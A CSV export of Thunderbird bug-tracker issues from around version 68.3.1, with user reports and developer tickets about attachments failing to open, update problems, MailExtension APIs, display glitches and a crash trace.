Issue id,Summary,Status,Priority,Resolution,Description
1606527,Command-line flag -options is broken,RESOLVED,--,DUPLICATE,[This code](https://searchfox.org/comm-central/rev/0da7f52e68483ce2f03d17fa7e7e3cdfceb193e5/mail/components/MessengerContentHandler.jsm#278) hasn't been updated for preferences-in-a-tab. The URL it tries to open is wrong (should be aboutPreferences.xhtml) but we don't want to open that in a window of its own anyway.
1606552,Attachment urls are not returned from 'browser.messages.getFull',RESOLVED,--,DUPLICATE,"I'm trying to use the `browser.messages.getFull` API to get the urls of attachments so that I can display them. When I use this API, I'm only getting the body for the main email, not the urls for the attachments. For example, the email I'm looking at at the moment has this rough structure: ``` { contentType: ""message/rfc822"", parts: [{ contentType: ""multipart/mixed"", parts: [{ contentType: ""multipart/alternative"", parts: [{ contentType: ""text/plain"", body: ""Yay, a body!"" }, { contentType: ""text/html"", body: ""<html stuff..."" }] }, { contentType: ""image.jpeg"", size: 3653748, name: ""2019.jpg"" }] }] } ``` As this doesn't have the attachment urls, there doesn't appear to be any way to get attachment data from the APIs."
1606557,tag colors don't display in list of messages,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: nothing in particular Actual results: I gave a specific message a colour (red). When is is listed in the inbox, the colour isn't there. Only when I select (click) the message, the colour is there. Expected results: The message should be red and always stay red."
1606559,Plug-in isn't working anymore since update,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: nothing in particular Actual results: Since the latest update, the plugin ""header tools lite"" doesn't work anymore. Expected results: The plugin should still work."
1606569,Hyperllinks and Attachments Don't Work,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Background: Windows 10 Build 18362.19h1_release 190318-1202 Thunderbird 68.3.1 (32-bit) -- does it need to be a 64 bit version? Firefox 74.0 (64-bit) as default browser Adobe Acrobat XI Thunderbird profile copied from old computer. Attempted to follow hyperlinks in the email and open attachments running Thunderbird in SafeMode Turned off Windows Defender Firewall Deleted the attachment associations in the Options|Attachments dialog so that T'Bird would ask me how to open the attachment Verified (using Config Editor) the hyperlink parameters were ""TRUE"" Repeated the same test with a clean install of Thunderbird with a brand new profile. Actual results: Clicking on a HyperLink in an email does nothing (whether or not in SafeMode; whether or not using the copied or a new profile) that it is would not send me to my browser. I tried using FireFox as the default browser and with Google Chrome as the default browser. Cut/Paste of the URL to the browser address window was successful. Clicking on an attachment (in this test a pdf file) does not launch the target application. The sa"
1606573,Need a persistent id for messages,RESOLVED,--,FIXED,"The current message id is not persistent across restarts. That has a few issues: * A WebExtension can't store its own additional data alongside a message (e.g. a different type of tagging or classifying mechanism). * A WebExtension can't have a tab open with the contents of a particular message in, and have it survive a restart. Since Thunderbird restores tabs, this particularly affects Thunderbird Conversations - I used to pass the uri of the message to the tab in the query parameters, and this would be restored on restart. I can't do this with the message id, as that is no longer persistent, so I'll get a random message. I'm not sure why it was felt that these need non-persistent Ids? I'm fine with the idea that they are not the existing uris, but there are valid cases I think where we need them persistent."
1606584,Change the folder enumeration MailExtension API from a flat list to a hierarchy,RESOLVED,--,FIXED,"I would like the accounts MailExtension API to preserve the tree-like structure of the folder tree for a given account, rather than require clients to jump through hoops to reconstruct that structure based on string manipulation to split paths in the folder URI. The attached patch does just that; since it only adds an extra property, I believe the breakage should be close to non-existent and I doubt that anyone relies on this yet. Thanks, Jonathan"
1606616,"In 68.3.1, I can't see any names in my address book unless I search",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Click on Address Book in menu, book opens up, it's blank, top of empty book states the following: ""Contacts from remote address books are not shown until you search. This address book shows contacts only after a search."" But in addition to no names or addresses showing, no address books are listed. Actual results: Screenshot attached. Expected results: I should be able to see multiple address books and all addresses in all books. That is how Thunderbird has always worked. An address book is made less than useful when the listings cannot be visually scanned."
1606619,key3.db encryption key remains on disk from Thunderbird 52.x (becomes issue if adding a master password post 60.x),RESOLVED,--,FIXED,"We haven't yet fixed bug 1475775 in Thunderbird. Because of the risk of key dataloss (e.g. bug 1510212), we're waiting for a solution that is more reliable than what Firefox had used as a fix. Let's use this new bug to track fixing the issue in Thunderbird. In separate NSS bug 1561368 we're working out an appropriate solution, potentially at the NSS code level."
1606621,"Thunderbirds constantly reverts to ""Archives"" folder even though I configure it to use ""Archive""",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: * sign-up for mailbox.org or fastmail account (they have archive folder under `/Archive` and not Tb `Archives`) * Change Tb configuration to use `/Archive` folder * (not sure if restart is required, I think it does) * Try to archive any message from the inbox Actual results: Thunderbird will still try to move message to `/Archives` folder - sometimes it would create that folder (mailbox.org) other times it would go bonkers (especially when archiving from subfolder with option 'keep folder structure') and move message to main archive directory. I think the most annoying thing is with mailbox.org, where it creates `/Archives` directory each time and moves messages there. I checked and settings for that mailbox still says ""Archive directory on mailbox.org"" so... something really weird is happening... Expected results: Well, Thunderbird should move messages where it's instructed to move them..."
1606670,Tiny fonts in plain text message and composition windows,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Compose a message in plain text format, or view a message received in plain text format. Actual results: As of the most recent update a few days ago (to 68.3.1), the default fonts in plain-text composition and message windows default to a tiny size. I tried Tools->Options->Display and set the plain text font size to ""larger"", but it had no effect. Expected results: The default font size should not have been changed by the update, or changing the font size under Tools->Options should have increased the font size."
1606682,Thunderbird 68.3.1/macos does not begin to run,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Click the icon of Thunderbird. Actual results: Menu bar is displayed, but everything stops there. ""Force Quit Application"" results in ""No Response"". Expected results: The menu bar will be clickable and a window will appear."
1606693,Mouse acting strange after latest updates v68.3.1 in Win7,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Steps to reproduce: Installed v68.3.1 in Win7 PC Actual results: Mouse acts stange. It opens email in new window when I select item in Inbox, instead of displaying it in pane as with v60.9.1 and previous. When deleting message from Inbox using mouse to select, it deletes the message and the FOLLOWIING message in Inbox. Expected results: Should act as before in previous versions."
1606709,Unable to open a PDF Attachment,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I tried to open the attachment to the attached message several times in repeated messages. I don't know whether to attach or forward the message either from Thundeerbird or from Outlook. If the former, how? Actual results: I received the following message: There was an error in opening this document. The file cannot be found I was able to open it in Outlook. Expected results: It should have opened. The message was originally sent to the ieee server which picked it up from hsgru@msn.com and transmitted it to hgruenberg@ieee.org hence to Thunderbird operating under Windows 10"
1606711,"If checking new mail at startup and after a time interval, a second primary/master password prompt appears when the startup prompt isn't answered",RESOLVED,--,WORKSFORME,"If checking new mail at startup and after a time interval, a second master password prompt appears when the startup prompt isn't answered. This is from bug 584014 comment #88. I reproduced this on a profile with 9 IMAP accounts, but apparently it fails with less."
1606914,different subjects are shown with one and the same email,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I did not do (nothing) but receiving my emails. Occurs in Version 68.3.1 and Build-ID 20191215232630. Actual results: With one and the same email, TWO DIFFERENT subjects are displayed! See Screenshot attached! Expected results: Of course, the subject displayed in the mails list and the open mail should be the same in both cases. ;-)"
1606926,Print Preview Screen buttons too large,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: hit ""Print Preview"" in any email message, the preview window comes up but the buttons take half the screen Link to this issue in forum here https://support.mozilla.org/en-US/questions/1276416?utm_campaign=questions-reply&utm_medium=email&utm_source=notification Actual results: The buttons above the message take up half the screen This also happens here with 72b2 32b/W10, but not with TB 68"
1606965,MailExtension: messages.update(): read flag is not saved to imap server,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Disable the ""auto mark as read"" feature: mailnews.mark_message_read.auto -> false Install https://github.com/kkapsner/mark-as-read Select a message and view it for more than 2 seconds -> it will be marked as read. Switch to another folder and back to force a refresh of the message states -> the message will be marked unread again. I also enabled the IMAP log and there was no entry to show that the flag was sent. Actual results: The read flag was not saved to the IMAP server. Expected results: The read flag should be saved to the IMAP server."
1606974,UpdateVerify failures macOS beta 72,RESOLVED,--,FIXED,"Update Verify fails on 72 beta for macOS only on some tests. The problem stems from bug 1482788 which involved some extra files to added to the macOS DMG files during the signing process that were not tracked by the installer/updater. Bug 1568654 fixed that by adding those files to removed-files so the updater would remove them. Except it was fixed incorrectly. Analyzing the update manifests in the macOS MAR file for 72.0b3, these commands are listed towards the end of the file: ``` remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/_CodeSignature/._CodeResources"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/Resources/English.lproj/._schema.strings"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/Resources/English.lproj/._InfoPlist.strings"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/Resources/._schema.xml"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/._Info.plist"" ``` The rest of the commands in the update manifests do not have ""Thunderbird.app"" prefixing the rest of the target path: ``` add ""Contents/"
1607012,Automatic update to latest version (68.3.1) since this update its does not start any more.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: After the automatic update to Thuderbird 68.3.1 it crashed at start up of thunderbird. Tried 72.0beta same result. Actual results: Automatic update to Thunderbird 68.3.1 Start application via desktop or start menu, does not make any difference. For 72.0beta: Download and install beta. Start application (desktop and start menu tested) In both cases Thunderbird does not start. It presents the crash reporter. Expected results: I expected, that the application started as usually."
1607029,Previously read messages display only after repairing every folder. New messages display properly.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I did nothing to create this issue, it appeared after downloading the 68.3.1 (32 bit) version. I rebuilt the Global database per your help files to no avail Actual results: Every folder I have, including the inbox, only displays new messages, previously read messages aren't displayed unless selecting right click - properties - repair This is a major problem for doing research in older message. Expected results: All previously read messages in each folder should be displayed when selecting any given folder, in addition to the unread ones"
1607034,Text looks low-res/blocky,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Render text in any email. (Windows 10 1909, NVidia GeForce GT 710 card on 1920 x 1080 displays). Actual results: Text looks low-res/blocky in both TBird and Firefox, worse at some font sizes. It it as if font smoothing is turned off. Text looks normal in other apps. Expected results: Normal text rendering."
1607037,Does not properly update from 60.9.1 to 68.3.1 (or 68.4 or 68.5),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Allowed Thunderbird to attempt automatic update from 60.9.1 (64-bit) to 68.3.1 (64-bit). Same behavior results from attempt to install 68.3.1 directly after uninstalling 60.9.1 manually. Actual results: Hangs on ""Applying update"". If it gets beyond that, all fields are blank, most menu items do not work, and it has created a new profile. If I try to select my actual profile, that does not work. It seems that it does not know how to deal with my existing profile properly. I'm on Windows 10 Pro 1809. Expected results: Update should have completed, displayed the accounts, etc., in my profile, and menus should work normally."
1607048,Thunderbird 68.3.1 will only allow me to type short lines of text (72 characters) before it automatically wraps the text being typed to the next line.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Thunderbird 68.3.1 will only allow me to type short lines of text (72 characters) before it automatically wraps the text being typed to the next line. I cannot find a setting that will allow me to type longer variable-length lines of text in email messages that are automatically wrapped to the next line based on the horizontal width of the computer screen and/or window from which an email message is being viewed. Actual results: The same thing happens every time I try to type an email message. Expected results: I should have been able to type variable length text lines that are automatically wrapped to the next line based on the horizontal width of the computer screen and/or window from which a newly composed email message is being viewed."
1607058,bad organisation / explanation of local and remote folders,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: it is not my do ; it is a do of thunderbird. you consider mail-storage in the cloud. my provider was attacked, and their storage was altered. thunderbird memorize pointer to mail, but dont show nothing. content of mail was lost. i prefer local storage. not only : i translate my house in few month, and have not cable link for internet. i work only with wifi on gsm-spot by my smartphone. impossible to write mail without wifi. impossible to write draft without wifi. my account on provider is never empty. Actual results: installer ask questions, but in french, it is not really and not enough clear. in tree-box, external storage is not clearly identified about local storage. it is important to connect to mail-account. but don't forget global installation when you work only in cloud (mail, folder, archive) and when you work partial/only in local (mail/folder/archive). Expected results: in next month, i migrate from actual pc (win7pro) to new computer. like my las migration (10 years old), it is possible to lost all thunderbird content. never mind, i redo."
1607062,"""Check for new messages at startup"" doesn't work. Changing mail.accountmanager.defaultaccount helps, briefly, then problem returns",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Preconditions: I monitor several email-adresses, mostly from aol.de and aol.com, but also gmx.de and t-online.de. For all of these adresses, the ""Check for new messages at startup"" (German: ""Beim Starten auf neue Nachrichten prüfen"") is activated. This worked flawlessly up until beta 70 or 71. The problem still exists with version 72b3. Steps to reproduce: <a> Before starting Thunderbird, make sure there are unread messages (e. g. by using the web-interface of your provider) <b> Start Thunderbird <c> Watch as Thunderbird is checking for new messages Actual results: In the status bar, there are some messages about Thuderbird connecting to the various providers. In most cases, the unread messages (see <a> above) are not shown. It seems as if just one (randomly chosen) acccount gets checked thoroughly. (The activity protocol shows nothing or one account at most.) After 10 minutes of waiting (the standard time), all accounts are finally being checked and this time, the messages from <a> are shown. (Now, the activity protoccol also shows the account(s) that was/were missing befo"
1607075,TypeError: textbox is null aboutAddonsExtra.js,RESOLVED,--,INVALID,nightly build newish profile on system with no add-ons tools > addons TypeError: textbox is null aboutAddonsExtra.js:44:25 <anonymous> chrome://messenger/content/aboutAddonsExtra.js:44 (Async: setTimeout handler) <anonymous> chrome://messenger/content/aboutAddonsExtra.js:42 <anonymous> chrome://messenger/content/aboutAddonsExtra.js:117 inContentOverlays chrome://messenger/content/specialTabs.js:368 onLoad chrome://messenger/content/specialTabs.js:463 loadURI chrome://global/content/elements/browser-custom-element.js:988 _wrapURIChangeCall chrome://global/content/elements/browser-custom-element.js:922 loadURI chrome://global/content/elements/browser-custom-element.js:987 getHtmlBrowser chrome://mozapps/content/extensions/extensions.js:1192 initialize chrome://mozapps/content/extensions/extensions.js:1218 initialize chrome://mozapps/content/extensions/extensions.js:521 initialize chrome://mozapps/content/extensions/extensions.js:129 (Async: EventListener.handleEvent) <anonymous> chrome://mozapps/content/extensions/extensions.js:66
1607078,gears are not functioning,RESOLVED,--,INCOMPLETE,
1607082,Message Filter stopped working on upgrade to TB 68.3.1,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: My system auto updated to 68.3.1 today. Just after I noticed that filtering was not occurring Check on message filter shows the filter was displayed as ""Missing Custom Term"", ""matches"" and nothing - not even a box - for the term to match against. The filter had been working correctly before the upgrade for many, many months. This is the msgFilter file: version=""9"" logging=""no"" name=""Online Gala Entries"" enabled=""yes"" type=""17"" action=""Move to folder"" actionValue=""imap://my.gmail.username%40gmail.com@imap.gmail.com/my.folder.name"" condition=""AND (filtaquilla@mesquilla.com#subjectRegex,matches,^Web entry \d\d\d\d from)"" Note: Foldername, gmail username have been changed for protection. Actual results: Filtering did not occur. The messages appeared in the Inbox Expected results: The messages should have been filed in the folder ""WebEntry"""
1607085,The Thunderbird window expands by ~33% beyond the size of my computer screen upon opening a Calendar Lightening tab and manually resizing is difficult difficult to accomplish.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 Steps to reproduce: Upon opening a Lightning Calendar tab while in the Mail tab of Thunderbird, the entire size of the Thunderbird's window (including all tabs) resizes to about 33% greater than the horizontal size of my visible computer screen. Actual results: Upon opening a Lightning Calendar tab while in the Mail tab of Thunderbird, the entire size of the Thunderbird's window (including all tabs) resizes to about 33% greater than the horizontal size of my visible computer screen. Expected results: The screen size should remain the same size as it is while in the Mail Tab - which actually fits the size of the screen (and resizes properly). I noticed this problem began occurring after I updated Lightning to 68.3.1.1 (December 19, 2019). Again, the problem only occurs after opening a Lightning calendar tab - and it then affects the entire Thunderbird window for all tabs."
1607089,Crash in [@ }'] free-after-use in AsyncIHandlerControl,RESOLVED,--,WORKSFORME,"all crashes are Windows. majority have crash address 0xe5e5e5e5. A few are 0xffffffffffffffff like bp-08f8146a-29f0-4aa9-8eb9-bffca0200104 some are startup crashes, most are not. no apparent correlation to crash address. every crashes I looked at has no third party AV, which seems *quite* odd, and no add-ons (except bp-3284c6dd-172e-4dec-833a-9b1b90200104 has one addon) bp-c9163a13-ea75-48e6-8245-bc7e00200105 crash address 0xe5e5e5e5 0 xul.dll [thunk]:AsyncIHandlerControl::`vcall'{20, {flat}}' }' 1 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1175 2 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 3 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:88 4 xul.dll MessageLoop::RunHandler ipc/chromium/src/base/message_loop.cc:308 5 xul.dll MessageLoop::Run ipc/chromium/src/base/message_loop.cc:290 6 xul.dll nsBaseAppShell::Run widget/nsBaseAppShell.cpp:137 7 xul.dll nsAppShell::Run widget/windows/nsAppShell.cpp:412 8 xul.dll nsAppStartup::Run toolkit/components/startup/nsAppStartup.cpp:276 9 xul.dll XREMain::XRE_mainRun toolkit/xre/nsAppRunner.cpp:4616 beta crash bp-0d69007e-3d56-4133-bc13-22bba0191219"
1607091,Thunderbird 68.3.1 (32 bit) refuses to find and open Word doc attachments after last update,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: Open a Thunderbird 68.3.1 (32 bit) and open any email message that has a Word document attached. Then double click on the dot doc file listed at bottom of message. Word opens but then can't find the file. However, if I right click that same file and save it to the hard drive Word has no problem opening it. This is not the behavior that has been normal up until the last and latest update. Actual results: After the last and latest update Thunderbird fails to link the attached file correctly so Word can not find the file but the file is not corrupt and can be verified by saving the attached file to the hard drive. Expected results: Prior to the last update I could double click an attached Word document and Word would open and then open the attached file. After the last update that stopped. Word opens but is unable to locate the file."
1607094,Unable to move messages from inbox to IMAP folder,RESOLVED,--,DUPLICATE,"+++ This bug was initially created as a clone of Bug #1522483 +++ User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Steps to reproduce: Using Thunderbird with GMail account. No local folders, just remote IMAP folders (labels). At startup, message moves to a folder (using menu or click and drag) work fine. After some time (and several moves to the same IMAP folder), I am no longer able to move messages to that folder. Moves to other IMAP folders continue to work. Restarting the software clears the error. Actual results: Message ""Moves"" to a folder stop working after having moved several messages to that folder. Expected results: Message ""Moves"" should always work. **I was finally able to reproduce this problem while running in Debug mode. The log file has been uploaded to Google Drive (too large to attach). File URL is:** https://drive.google.com/file/d/1-29WcT43O49Sc_G2RiD4KjKn7hrsLF3v/view?usp=sharing"
1607098,Attachment filename with more than two words separated by spaces will not open,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 CCleaner/77.1.1834.93 Steps to reproduce: Am using Thunderbird 68.3.1 replease sent myself a test email with a Microsoft Word file attached containing 3 words in its filename Actual results: clicking on attachment starts Microsoft word, but it reports it cannot open a file, which is reported as a Microsoft Word file with only the first word as its filename. Expected results: Ms Word should have open the file correctly, as previous versions of Thunderbird have allowed."
1607164,Deleting a message in a standalone window only removed the delete button.,RESOLVED,--,WORKSFORME,"Following the steps to reproduce given in bug 646168#c23 > https://support.mozilla.org/en-US/questions/1272097 > Testing another user claiming a bug where window does not close on delete. > Agreed there was a bug, but also managed to get a crash on last test. > > > Windows 10 > Thunderbird 68.2.1 > Set Unified view > The following all performed in the 'Unified Inbox' > Set Sort by to include threaded > Set options: Open messages in: 'An existing message window' and 'Close message window/tab on move or delete' > > Double click to open any message - not necessarily a threaded email. > email opens in new window. > Click on 'Delete' button > Window with deleted messages remains open, but note the 'Delete' button has been removed. > Close 'deleted email' window - top right X > > Set options: Open messages in: 'An new message window' and 'Close message window/tab on move or delete' > Open email, email opens in new window, click on 'Delete'. Same result as above. > Close 'deleted email' window - top right X Deleting the message does remove the delete button from the window. So filing this bug to follow that up."
1607197,Completely lost everything in new update,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Went to get new update and everything gone. Actual results: Everything gone, all settings, etc. Expected results: Upgrade shouldn't have lost the original settings."
1607377,newline chars of signature text from external plain text file not included in signature,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Included newline characters before and after other text in signature (plain text, not from an external file). Actual results: Newlines were stripped. Expected results: Text should be left as entered."
1607416,Applying update never finishing,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Opened Thunderbird from my desktop, was given a small window telling me it was updating, it then loading the program but did not display my email account or any relevant information. Wouldn't allow me to click on anything other than 'About Thunderbird' where it informed me that it was 'applying update 68.3.1 (32-bit)'. Actual results: Quite simply, nothing happened! It has continued to say 'applying update' ever since. It's now been a day and a bit that's it been doing this, meaning I can't access my emails (first started Monday January 6th). Expected results: Being able to access my emails is what should have happened!!"
1607425,"From View Source, german content has encoding issue",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: 1. Select an article within a newsgroup, whose subject/body contains german characters 2. Click on drop-down button ""More"" and select ""View Source"" option Actual results: Subject/Title are displayed with some strange characters Expected results: Subject/Title are displayed properly without strange characters."
1607453,"problemas con el manejo de adjuntos, en la versión Thunderbird Setup 68.3.0 y superior",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Thunderbird Setup 68.3.0 no maneja correctamente los adjuntos Actual results: los adjuntos con nombres compuestos con espacios intermedios se abren de forma inadecuada y la aplicación predeterminada intenta abrir archivos no válidos en ubicaciones incorrectas.
1607462,New messages no longer load automatically at startup,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Double checked options Actual results: Nothing Expected results: After latest update (68.3.1) Tbird no longer automatically downloads new messages at startup. Yes I checked that no option had changed
1607477,"""Insert HTML"" pane doesn't resize well",RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I occasionally modify my messages in HTML directly, using the menu functions Edit -> Select All Insert -> HTML These give me a (small) pane containing the HTML representation of the message, which I can edit directly. Actual results: That being said, the HTML pane is too small to give a good view of the bracketed HTML constructs. I can resize the pane horizontally and it gives a wider view. If I resize the pane vertically, however, it resizes the ""dead"" area of the pane rather than the edit-window, which is useless. Expected results: The edit-window of the Edit HTML pane should re-size both vertically & horizontally."
1607480,Unread message in dark theme,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: In Thunderbird 64bit 68.3.1 color of unread message in dark theme is no longer blue but it is withe as old less readable version. Please see the attached image. Actual results: Text color of unread message in message pane is white. Expected results: Text color of unread message in message pane should be blue."
1607504,Print Preview window looks weird,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I've clicked on the Print Preview menu entry in main menu. Actual results: The Print Preview window's upper toolbar part is enormous instead of being a few pixels high. Expected results: The Print Preview window's upper toolbar part should be at least a few dozens of pixels high.
1607510,Missing double quotes when passing filename to external program,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I've clicked on an attachment to open it. Actual results: When the filename has spaces in it, there are multiple dialogs about not finding the file, so when the filename has 3 spaces separating words in it, there are 4 dialogs. Expected results: Prior to version 72 everything worked fine, since Thunderbird has passed the filename in double quotes, like ""this is a file.pdf"", so the external application knew he got one filename as one parameter in double quotes. From version 72 it passes the above filename as this is a file.pdf which renders opening links unusable. Saving the file to somewhere then opening it is the only possible solution ATM. (I also created a Windows .CMD file to check how many parameters it gets, and when calling it from TB 72 it got 4 parameters taking the above example. I've attached the two dialogs I've got with opening ""sc-PortaCreator_Kieg december1.xlsx"" (there are no double quotes in the filename, of course, bug TB should pass filenames like this)."
1607515,Drag and drop to right-hand side of Add-Ons Manager doesn't work (take 2),RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1566347 +++ It broke again. TB 72 beta 3 already not working. Alice, could you please find the regression for us: STR: Get some TB add-on as XPI file, drag the file onto the Add-ons manager. It shows a stop sign."
1607526,Don't show the To: field if the Newsgroup or Follow-up fields are in use,RESOLVED,--,FIXED,"As per Magnus comment on bug 1601748#c7 > if you have a newsgroup selected it should not have To showing at all. Newsgroup should show, and maybe Follow-up too, since that's kind of standard for news."
1607599,TypeError: openFeedView.children.forEach is not a function mailWindowOverlay.js:816 visiting appmenu -> Message,NEW,--,,"In Thunderbird trunk, just visiting the appmenu -> Message submenu throws an error in the console: TypeError: openFeedView.children.forEach is not a function mailWindowOverlay.js:816:25 This only happens in the appmenu. In the main menu (Message submenu) this does not happen."
1607601,MICROBUG: Save As has default file type all but file is saved as .eml,NEW,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78 Steps to reproduce: 1. Right click message. 2. Click Save As… Actual results: Save dialog file type is All. Expected results: File type should be .eml as message is about to be save in."
1607613,Tools - Account Settings - Junk Settings - Select and Toggle Broken,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Under Tools -> Account Settings select a server. Click on Junk Settings. In the Do not automatically mark mail as junk if the sender is list click on a mailing list. Note the space-bar toggles the check-mark. Use the cursor keys to move the selection bar and note the highlight moves. Press the space-bar and note the PREVIOUSLY-SELECTED item is toggled (not the current selection.) Actual results: Changing the selection by clicking moves the highlight and the space-bar toggles the highlighted item. Navigating with the cursor keys changed the highlight but the space-bar toggles the previous selection. Expected results: Changing the selection with the cursor keys or clicking the mouse should be equivalent.
1607688,Editing of mail filters has with the last update become incredibly slow. The more filter lines the slower the filtering!,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I only updated Thunderbird from the previosu to the newest version 68.3.1 (32 bits) and since then the mail filtering and editing of the mail filters suddenly suffered a delay of nearly 2 minutes. Actual results: Mail filtering and mail filter editing has becoam very slow/delayed. Expected results: Hardly any delay should be seen, particulalrly when the mail filter is started up for editing of the filters but then nearly 2 minutes pass before a filter appears and can be edited."
